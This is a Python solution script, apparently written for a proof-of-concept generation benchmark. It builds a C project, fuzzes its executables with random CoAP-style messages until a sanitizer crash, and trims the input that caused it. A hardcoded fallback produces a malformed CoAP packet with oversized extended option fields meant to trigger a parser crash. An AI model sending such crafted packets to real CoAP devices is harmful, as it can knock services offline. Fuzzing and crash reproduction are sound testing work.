import os
import tarfile
import tempfile
import subprocess
import time
import random
import stat
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            root = self._extract_project(src_path, tmpdir)
            self._build_project(root)
            exes = self._find_executables(root)
            if not exes:
                return self._fallback_poc()
            exes = self._prioritize_executables(exes)
            # Fuzz using stdin mode
            poc_info = self._fuzz_for_crash(exes, time_budget=12.0, mode="stdin")
            if poc_info is None:
                # Try file-argument mode with smaller budget
                poc_info = self._fuzz_for_crash(exes, time_budget=5.0, mode="file")
            if poc_info is None:
                return self._fallback_poc()
            poc, mode, exe = poc_info
            trimmed = self._trim_trailing(exe, poc, mode, time_budget=3.0)
            return trimmed
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _extract_project(self, src_path: str, tmpdir: str) -> str:
        root = tmpdir
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
            entries = [e for e in os.listdir(tmpdir) if not e.startswith(".")]
            if len(entries) == 1:
                candidate = os.path.join(tmpdir, entries[0])
                if os.path.isdir(candidate):
                    root = candidate
        except tarfile.ReadError:
            root = src_path
        return root

    def _run_cmd(self, cmd, cwd, env, timeout: float):
        try:
            subprocess.run(
                cmd,
                cwd=cwd,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=timeout,
                check=False,
            )
        except Exception:
            pass

    def _build_project(self, root: str):
        env = os.environ.copy()
        build_timeout = 20.0
        # Prefer build.sh if present
        build_scripts = []
        for dirpath, dirnames, filenames in os.walk(root):
            if "build.sh" in filenames:
                build_scripts.append(os.path.join(dirpath, "build.sh"))
        if build_scripts:
            build_scripts.sort(key=lambda p: p.count(os.sep))
            script = build_scripts[0]
            self._run_cmd(
                ["bash", script],
                cwd=os.path.dirname(script),
                env=env,
                timeout=build_timeout,
            )
            return
        # Fallback: configure + make / cmake / make
        configure_path = os.path.join(root, "configure")
        if os.path.exists(configure_path):
            self._run_cmd(["sh", "configure"], cwd=root, env=env, timeout=build_timeout)
        cmake_lists = os.path.join(root, "CMakeLists.txt")
        if os.path.exists(cmake_lists):
            build_dir = os.path.join(root, "build")
            os.makedirs(build_dir, exist_ok=True)
            self._run_cmd(["cmake", ".."], cwd=build_dir, env=env, timeout=build_timeout)
            self._run_cmd(
                ["cmake", "--build", ".", "-j8"],
                cwd=build_dir,
                env=env,
                timeout=build_timeout,
            )
        makefile_path = os.path.join(root, "Makefile")
        if os.path.exists(makefile_path):
            self._run_cmd(["make", "-j8"], cwd=root, env=env, timeout=build_timeout)
        else:
            for sub in ("src", "source", "project"):
                subdir = os.path.join(root, sub)
                if os.path.isdir(subdir) and os.path.exists(os.path.join(subdir, "Makefile")):
                    self._run_cmd(["make", "-j8"], cwd=subdir, env=env, timeout=build_timeout)
                    break

    def _find_executables(self, root: str):
        exes = []
        for dirpath, dirnames, filenames in os.walk(root):
            for name in filenames:
                full = os.path.join(dirpath, name)
                try:
                    st = os.stat(full)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                if not os.access(full, os.X_OK):
                    continue
                lname = name.lower()
                _, ext = os.path.splitext(lname)
                if ext in (".sh", ".py", ".pl", ".rb", ".js", ".lua", ".php", ".tcl"):
                    continue
                if ext in (".so", ".a", ".dll", ".dylib", ".lib", ".o", ".lo", ".la"):
                    continue
                exes.append(full)
        return exes

    def _prioritize_executables(self, exes):
        def score(path: str):
            name = os.path.basename(path).lower()
            s = 0
            if "coap" in name:
                s += 10
            if "poc" in name:
                s += 6
            if "fuzz" in name or "harness" in name:
                s += 4
            if "test" in name or "example" in name or "demo" in name:
                s += 2
            if name in ("a.out", "main"):
                s += 1
            return (-s, path.count(os.sep), len(name))

        return sorted(exes, key=score)

    def _run_target(self, exe: str, data: bytes, mode: str) -> bool:
        env = os.environ.copy()
        if "ASAN_OPTIONS" not in env:
            env["ASAN_OPTIONS"] = "detect_leaks=0,abort_on_error=1"
        try:
            if mode == "stdin":
                result = subprocess.run(
                    [exe],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    env=env,
                    timeout=0.2,
                    check=False,
                )
            else:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                try:
                    tmp.write(data)
                    tmp.flush()
                    tmp.close()
                    result = subprocess.run(
                        [exe, tmp.name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        env=env,
                        timeout=0.2,
                        check=False,
                    )
                finally:
                    try:
                        os.unlink(tmp.name)
                    except Exception:
                        pass
        except subprocess.TimeoutExpired:
            return False
        except OSError:
            return False
        rc = result.returncode
        if rc < 0:
            return True
        return False

    def _random_bytes(self, length: int, rand: random.Random) -> bytes:
        return bytes(rand.getrandbits(8) for _ in range(max(0, length)))

    def _random_coap_message(self, rand: random.Random, total_length: int) -> bytes:
        if total_length < 4:
            total_length = 4
        tkl = rand.randint(0, 8)
        min_len = 4 + tkl
        if total_length < min_len:
            total_length = min_len
        b = bytearray(total_length)
        ver = 1
        typ = rand.randint(0, 3)
        first = (ver << 6) | (typ << 4) | tkl
        b[0] = first
        b[1] = rand.randint(0, 255)
        msg_id = rand.randint(0, 0xFFFF)
        b[2] = (msg_id >> 8) & 0xFF
        b[3] = msg_id & 0xFF
        for i in range(tkl):
            b[4 + i] = rand.randint(0, 255)
        for i in range(4 + tkl, total_length):
            b[i] = rand.randint(0, 255)
        return bytes(b)

    def _fuzz_for_crash(self, exes, time_budget: float, mode: str):
        if not exes or time_budget <= 0:
            return None
        seed = 0xC0A50000 + (1 if mode == "file" else 0)
        rand = random.Random(seed)
        start = time.time()
        while time.time() - start < time_budget:
            if rand.random() < 0.8:
                length = 21
            else:
                length = rand.randint(1, 64)
            if rand.random() < 0.5:
                data = self._random_bytes(length, rand)
            else:
                data = self._random_coap_message(rand, length)
            for exe in exes:
                if self._run_target(exe, data, mode):
                    return data, mode, exe
        return None

    def _trim_trailing(self, exe: str, poc: bytes, mode: str, time_budget: float) -> bytes:
        if not poc or time_budget <= 0:
            return poc
        start = time.time()
        data = poc
        while len(data) > 1 and (time.time() - start) < time_budget:
            candidate = data[:-1]
            if self._run_target(exe, candidate, mode):
                data = candidate
            else:
                break
        return data

    def _fallback_poc(self) -> bytes:
        length = 21
        b = bytearray(length)
        # Header: version=1, type=0, TKL=4
        b[0] = (1 << 6) | (0 << 4) | 4
        b[1] = 1  # GET
        b[2] = 0
        b[3] = 1
        # Token (4 bytes)
        b[4] = 0x11
        b[5] = 0x22
        b[6] = 0x33
        b[7] = 0x44
        # Option header with extended delta and length
        b[8] = (13 << 4) | 13
        b[9] = 255  # extended delta byte
        b[10] = 255  # extended length byte
        for i in range(11, length):
            b[i] = 0x41  # 'A'
        return bytes(b)